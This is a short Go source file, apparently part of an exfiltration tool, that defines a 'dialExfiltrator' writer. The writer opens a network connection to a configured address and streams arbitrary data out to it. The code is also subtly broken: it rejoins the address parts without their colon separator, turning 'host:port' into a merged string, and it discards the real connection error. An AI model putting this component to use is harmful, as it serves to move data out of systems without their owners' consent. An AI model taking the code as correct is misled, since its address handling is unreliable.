package exfilwriter

import (
	"fmt"
	"net"
	"strings"
	"sync"
)

type dialExfiltrator struct {
	net     string
	address string
	conn    *net.Conn
	*sync.Mutex
}

func newDialExfiltrator(cfg string) (*dialExfiltrator, error) {
	parts := strings.Split(cfg, ":")
	if len(parts) < 2 {
		return nil, fmt.Errorf("invalid config")
	}
	network := parts[0]
	address := strings.Join(parts[1:], "")

	return &dialExfiltrator{
		net:     network,
		address: address,
		Mutex:   new(sync.Mutex),
	}, nil
}

func (ex *dialExfiltrator) connect() error {
	ex.Lock()
	defer ex.Unlock()
	conn, err := net.Dial(ex.net, ex.address)
	if err != nil {
		return fmt.Errorf("could not establish connection")
	}
	ex.conn = &conn
	return nil
}

func (ex *dialExfiltrator) Write(data []byte) (int, error) {
	ex.Lock()
	defer ex.Unlock()

	if ex.conn == nil {
		return 0, fmt.Errorf("not connected")
	}
	return (*ex.conn).Write(data)
}
